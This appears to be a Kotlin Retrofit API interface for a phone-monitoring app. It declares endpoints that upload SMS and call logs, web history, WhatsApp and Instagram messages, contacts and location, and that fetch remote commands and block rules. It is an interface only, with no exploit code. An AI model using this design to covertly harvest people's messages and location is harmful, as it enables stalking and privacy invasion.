package com.spapp.monitoring.network

import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.Header
import retrofit2.http.POST

interface ApiService {
    @POST("api/devices/activate")
    suspend fun activateDevice(@Body request: ActivateRequest): Response<ActivateResponse>

    @GET("api/sync/feature-flags")
    suspend fun getFeatureFlags(@Header("Authorization") bearer: String): Response<FeatureFlags>

    @POST("api/sync/app-usage")
    suspend fun syncAppUsage(
        @Header("Authorization") bearer: String,
        @Body request: AppUsageSyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/sms-log")
    suspend fun syncSmsLog(
        @Header("Authorization") bearer: String,
        @Body request: SmsLogSyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/call-log")
    suspend fun syncCallLog(
        @Header("Authorization") bearer: String,
        @Body request: CallLogSyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/web-history")
    suspend fun syncWebHistory(
        @Header("Authorization") bearer: String,
        @Body request: WebHistorySyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/installed-apps")
    suspend fun syncInstalledApps(
        @Header("Authorization") bearer: String,
        @Body request: InstalledAppsSyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/whatsapp-messages")
    suspend fun syncWhatsAppMessages(
        @Header("Authorization") bearer: String,
        @Body request: WhatsAppMessagesSyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/instagram-messages")
    suspend fun syncInstagramMessages(
        @Header("Authorization") bearer: String,
        @Body request: InstagramMessagesSyncRequest
    ): Response<SyncCountResponse>

    @POST("api/sync/instagram/account")
    suspend fun updateInstagramAccount(
        @Header("Authorization") bearer: String,
        @Body request: Map<String, String>
    ): Response<Map<String, Any>>

    @POST("api/sync/contacts")
    suspend fun syncContacts(
        @Header("Authorization") bearer: String,
        @Body request: SavedContactsSyncRequest
    ): Response<SyncCountResponse>

    @GET("api/sync/commands")
    suspend fun getPendingCommands(@Header("Authorization") bearer: String): Response<List<RemoteCommand>>

    @POST("api/sync/location")
    suspend fun reportLocation(
        @Header("Authorization") bearer: String,
        @Body request: LocationReportRequest
    ): Response<Unit>

    @GET("api/sync/geofences")
    suspend fun getGeofences(@Header("Authorization") bearer: String): Response<List<GeofenceDto>>

    @POST("api/sync/geofence-event")
    suspend fun reportGeofenceEvent(
        @Header("Authorization") bearer: String,
        @Body request: GeofenceEventRequest
    ): Response<Unit>

    @POST("api/sync/fcm-token")
    suspend fun updateFcmToken(
        @Header("Authorization") bearer: String,
        @Body request: FcmTokenRequest
    ): Response<Unit>

    @POST("api/sync/permission-status")
    suspend fun syncPermissionStatus(
        @Header("Authorization") bearer: String,
        @Body request: PermissionStatusDto
    ): Response<Unit>

    @GET("api/sync/block-rules")
    suspend fun getBlockRules(@Header("Authorization") bearer: String): Response<List<BlockRuleDto>>

    @POST("api/sync/block-violation")
    suspend fun reportBlockViolation(
        @Header("Authorization") bearer: String,
        @Body request: BlockViolationRequest
    ): Response<Unit>

    @POST("api/sync/commands/{id}/ack")
    suspend fun ackCommand(
        @Header("Authorization") bearer: String,
        @retrofit2.http.Path("id") commandId: String,
        @Body result: AckCommandRequest
    ): Response<Unit>
}
